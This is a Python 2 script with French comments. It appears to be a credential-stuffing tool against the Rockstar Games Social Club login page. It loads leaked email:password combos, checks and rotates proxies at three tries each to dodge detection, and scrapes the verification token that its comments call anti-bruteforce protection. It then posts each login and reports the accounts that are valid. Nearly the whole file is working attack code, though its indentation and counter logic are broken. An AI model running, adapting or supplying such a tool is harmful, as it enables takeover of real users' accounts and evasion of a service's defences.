import requests
from requests import Request, Session
import threading
import sys
import Queue
import time
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from HTMLParser import HTMLParser
from socket import error as SocketError
import errno

# Brute forcer https  #TODO: Faire que le compteur marche 
							
							
class RecupProxy():

	def recupProxy(self):
		proxy = []
		fichierProxy = open("proxybons13.txt", "r")
		for line in fichierProxy:
			line = line[:-1]
			proxy.append(line)
		fichierProxy.close()	
		return proxy
		
	def checkProxy(self, IP):
		proxies = {'http': 'http://'+str(IP) }
		try:
    			req = requests.get('http://www.google.fr', proxies=proxies, timeout=5, verify=False)
    			print str(IP)+" is UP"
    			return IP
    		except requests.exceptions.Timeout:
       			print str(IP)+" is DOWN (timeout)"
       			return "BAD"
       		except requests.exceptions.ProxyError:
      	 		print str(IP)+" is DOWN (no proxy)"
      	 		return "BAD"      	 		
      	 	except requests.exceptions.ChunkedEncodingError:
      	 		print str(IP)+" is DOWN (no https)"
      	 		return "BAD"
      	 	except requests.exceptions.ConnectionError:
      	 		print str(IP)+" is DOWN (error de connect)"
      	 	     	return "BAD"
      	     	except SocketError:
			print str(IP)+" is DOWN (error de connect)"
      	 	     	return "BAD"

	def proxyThreading(self):
		proxy = self.recupProxy()	
   		pool = ThreadPool() # multithreading casse tete mais ca marche now
    		resultatbrut = pool.map(self.checkProxy, proxy)
  		pool.close()
   		pool.join()    	
		print resultatbrut
		proxyBons = []	
     		for item in resultatbrut:
       		 	if item is not "BAD":
        			proxyBons.append(item)   # je vois pas comment faire autrement que redonder ca, thread de merdes qui continue a filer
		print proxyBons    			  # des donnes malgre la sortie de function Threading()       		
		for item in proxyBons:
      			fichierProxyBons = open("proxybons3.txt", "a")
      	 		fichierProxyBons.write("%s\n" % item)
			fichierProxyBons.close()
		return proxyBons 	
      	 	      	 				
class RecupCombo():
	def __init__(self):
		self.mail = []
		self.password = []
		
	def recupMailPass(self):
		fichierCombo = open('combo.txt', "r")
		for line in fichierCombo:
			temp = line.split(":")
			self.mail.append(temp[0]) # Degueux mais ca fait l'affaire
			temp = temp[1][:-1]
			self.password.append(temp)
		fichierCombo.close()	
					
# Permet de recuperer les valeurs de __RequestVerificationToken sinon foutu car anti bruteforce token partout
class RecupToken(HTMLParser):

	def __init__(self):
		HTMLParser.__init__(self)
		self.token = []
	def handle_starttag(self, tag, attrs):
		if tag == "input":
			if attrs[0] == ("name", "__RequestVerificationToken"):
				self.token.append(attrs[2][1])

def main():
	# On instance tout ce bazzare
	
	g = RecupCombo() 
	g.recupMailPass() 
	h = RecupProxy()
	proxyBons = h.proxyThreading()
	print proxyBons
		
				
	print "Il y'a "+str(len(g.mail))+" login a tester"
	print "il y'a "+str(len(proxyBons))+" proxys de disponible a utiliser, soit "+str(3*(len(proxyBons)))+" login possible a tester"
	if (3*len(proxyBons)) < len(g.mail):
		print "PAS ASSEZ DE PROXY CORRECTS, AMELIORER LA PROXYLIST, UN PROXY = 3 TENTATIVES"
		exit()
		
	counterConnection = 0
	counterProxyList = 0
	
	for i in range(len(g.mail)):
		s = Session()
		# Recuper les cookies et token de la page de login
		f = s.get('https://socialclub.rockstargames.com/profile/signin')
		# Parsing dla rep
		pagerawtext = f.text
		parser = RecupToken()
		parser.feed(pagerawtext)
		
		# Le bon token parmis les 6 proposes est le 2 eme de la page de login
		# Creer la requete POST de login a GTA avec tout les headers et cookies necessaires.
		url = 'https://socialclub.rockstargames.com/profile/signincompact'
		req = Request('POST',  url)
		gta = s.prepare_request(req)
		gta.body = '{"login":"'+g.mail[i]+'","password":"'+g.password[i]+'","rememberme":false}'
		gta.headers['Host'] = "fr.socialclub.rockstargames.com"
		gta.headers['User-Agent'] = "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
		gta.headers['Accept'] = "application/json, text/javascript, */*; q=0.01"
		gta.headers['Accept-Language'] = "en-US,en;q=0.5"
		gta.headers['Accept-Encoding'] = "gzip, deflate"
		gta.headers['Content-Type'] = "application/json; charset=utf-8"
		gta.headers['RequestVerificationToken'] = str(parser.token[0])
		gta.headers['X-Requested-With'] = "XMLHttpRequest"
		gta.headers['Referer'] = "https://socialclub.rockstargames.com/profile/signin"
		gta.headers['Content-Length'] = len(gta.body)
		gta.headers['Connection'] = "keep-alive"
		
		proxies = {'http': 'http://'+str(proxyBons[i])}
		try:
			resp = s.send(gta,stream=False, timeout=5, verify=True, proxies=proxies)
			if resp.status_code == 200:
				print "[+] Compte "+g.mail[i]+" est VALIDE!!!!"+ str(proxies)+ str(resp.status_code)
			else: 
				print "[+] Compte "+g.mail[i]+" est INVALIDE !!"
		
		except requests.exceptions.Timeout:
       			print "ERROR INCONNUE"
       		except requests.exceptions.ProxyError:
      	 		print "ERROR INCONNUE"	     	 		
      	 	except requests.exceptions.ChunkedEncodingError:
      	 		print "ERROR INCONNUE"
      	 	except requests.exceptions.ConnectionError:
      	 		print "ERROR INCONNUE"
		except SocketError:
			print str(IP)+" is DOWN (error de connect)"
      	 	     	return "BAD"

		if counterConnection == 3:
			counterProxyList += 1
			counterConnection -= 3
			 
		counterConnection += 1
if __name__ == "__main__":
	main()



